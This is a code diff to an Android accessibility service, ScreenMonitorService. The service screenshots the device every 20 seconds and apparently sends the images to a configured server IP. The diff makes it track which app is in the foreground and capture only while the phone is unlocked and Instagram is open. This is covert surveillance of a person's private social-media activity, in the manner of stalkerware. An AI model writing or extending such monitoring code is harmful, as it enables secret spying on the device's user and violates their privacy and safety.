@@ -15,6 +15,8 @@ import org.json.JSONObject
 import android.content.Context
 import android.hardware.display.DisplayManager
 import android.view.Display
+import android.os.PowerManager
+import android.app.KeyguardManager
 import android.accessibilityservice.AccessibilityService.ScreenshotResult
 import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
 
@@ -24,6 +26,7 @@ class ScreenMonitorService : AccessibilityService() {
     private var isMonitoring = false
     private val POLLING_INTERVAL = 20000L // 20 seconds
     private var lastBitmapHash = 0
+    private var currentPackageName = ""
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -38,7 +41,11 @@ class ScreenMonitorService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        // Not used directly, we poll instead
+        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            event.packageName?.let {
+                currentPackageName = it.toString()
+            }
+        }
     }
 
     override fun onInterrupt() {
@@ -63,6 +70,12 @@ class ScreenMonitorService : AccessibilityService() {
     }
 
     private fun checkStatusAndCapture() {
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+        val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
+        
+        if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) return
+        if (!currentPackageName.contains("instagram")) return
+
         val serverIp = getSharedPrefsValue("server_ip")
         val deviceId = getSharedPrefsValue("device_id")
         
